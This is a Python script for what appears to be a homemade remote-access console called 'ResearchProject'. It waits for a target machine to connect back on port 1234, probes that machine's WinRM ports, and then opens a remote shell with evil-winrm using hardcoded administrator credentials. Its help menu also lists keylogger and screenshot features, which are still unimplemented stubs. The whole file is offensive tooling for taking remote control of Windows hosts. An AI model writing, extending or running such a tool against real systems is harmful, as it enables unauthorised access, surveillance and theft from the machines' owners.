import subprocess
import sys
import socket
import getpass

BANNER = r"""
:::::::::  :::::::::: ::::::::  ::::::::::     :::     :::::::::   ::::::::  :::    :::          :::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: :::::::::::
:+:    :+: :+:       :+:    :+: :+:          :+: :+:   :+:    :+: :+:    :+: :+:    :+:          :+:    :+: :+:    :+: :+:    :+:     :+:     :+:       :+:    :+:    :+:     
+:+    +:+ +:+       +:+        +:+         +:+   +:+  +:+    +:+ +:+        +:+    +:+          +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       +:+           +:+      
+#++:++#:  +#++:++#  +#++:++#++ +#++:++#   +#++:++#++: +#++:++#:  +#+        +#++:++#++          +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  +#+           +#+       
+#+    +#+ +#+              +#+ +#+        +#+     +#+ +#+    +#+ +#+        +#+    +#+          +#+        +#+    +#+ +#+    +#+     +#+     +#+       +#+           +#+        
#+#    #+# #+#       #+#    #+# #+#        #+#     #+# #+#    #+# #+#    #+# #+#    #+#          #+#        #+#    #+# #+#    #+# #+# #+#     #+#       #+#    #+#    #+#         
###    ### ########## ########  ########## ###     ### ###    ###  ########  ###    ###          ###        ###    ###  ########   #####      ########## ########     ###   
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    conn.close()
    server.close()

    return target_ip

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def check_connection(target_ip, timeout=3):
    ports = {
        5985: "WinRM (HTTP)",
        5986: "WinRM (HTTPS)"
    }

    print(f"[*] Checking Connection to {target_ip}...")

    for port, name in ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        try:
            sock.connect((target_ip, port))
            print(f"[+] {name} port {port} is OPEN")
        except socket.timeout:
            print(f"[-] {name} port {port} timed out")
        except ConnectionRefusedError:
            print(f"[-] {name} port {port} is CLOSED")
        except Exception as e:
            print(f"[-] {name} port {port} error: {e}")
        finally:
            sock.close()


def cli(target_ip):
    username = getpass.getuser()
    help_text = """
        Available commands:
        help, h        Show this help menu
        check          Check target connectivity (WinRM ports)
        evil-winrm     Connect to target using evil-winrm
        key-logger     To be determined
        screen-shot    To be determined
        exit, q        Exit the console
    """
    print("[*] Type help or h to see all commands...\n")
    while True:
        cmd = input(f"{username}@ResearchProject# ")
        if cmd == "exit" or cmd == "q":
            break
        elif cmd == "help" or cmd == "h":
            print(help_text)
        elif cmd == "check":
            check_connection(target_ip)
        elif cmd == "evil-winrm":
            connect_evil_winrm(target_ip)
        elif cmd == "key-logger":
            print("In progress...")
        elif cmd == "screen-shot":
            print("In progress...")
        elif cmd == "":
            continue
        else:
            print(f"[-] Unknown command: {cmd}")


def main():
    print(BANNER)
    try:
        target_ip = start_listener()
        cli(target_ip)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
    

if __name__ == "__main__":
    main()
